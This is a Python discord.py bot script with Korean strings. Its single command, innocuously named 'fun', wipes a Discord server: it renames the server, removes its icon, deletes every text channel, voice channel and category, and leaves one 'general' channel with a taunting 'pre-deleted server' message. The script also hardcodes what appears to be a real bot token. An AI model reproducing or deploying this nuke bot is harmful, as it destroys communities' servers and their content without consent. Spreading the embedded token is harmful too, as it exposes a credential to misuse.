import discord
from discord.ext import commands
from discord.utils import get

token = 'ODEzNjE1MzEyMTMyODk4ODg3.YDR4Tg.slU-IonwhfoXsle-ATXIPMitLwY'

intents = discord.Intents.default()
intents.members = True

bot = commands.Bot(command_prefix="%", intents=intents)

@bot.event
async def on_ready():
    print("켜졌어")

@bot.command(name="즐겁다")
async def _clean(ctx):
    name = '채팅 채널'
    name2 = "음성 채널"
    owner = str(ctx.guild.owner.name)
    emojini = get(ctx.guild.emojis)
    roles = get(ctx.guild.roles)
    categories = get(ctx.guild.categories, name=name)
    categories2 = get(ctx.guild.categories, name=name2)
    with open("I enjoy.jfif", 'rb') as f:
        icon = f.read()
    await ctx.guild.edit(icon=None, name=f"{owner}님의 서버")
    for c in ctx.guild.text_channels:
        await c.delete()
    for ch in ctx.guild.voice_channels:
        await ch.delete()
    for cha in ctx.guild.categories:
        await cha.delete()
    await ctx.guild.create_category("채팅 채널")
    await ctx.guild.create_category("음성 채널")
    name = '채팅 채널'
    name2 = "음성 채널"
    categories = get(ctx.guild.categories, name=name)
    categories2 = get(ctx.guild.categories, name=name2)
    await ctx.guild.create_text_channel("일반", category=categories)
    await ctx.guild.create_voice_channel("일반", category=categories2)
    channel = get(ctx.guild.channels, name="일반")
    embed = discord.Embed(title="서버도 깔끔", description="미리-삭제한 서버!")
    embed.set_footer(text="그냥 터트려서 대접하세요!")
    await channel.send(embed=embed)

bot.run(token)
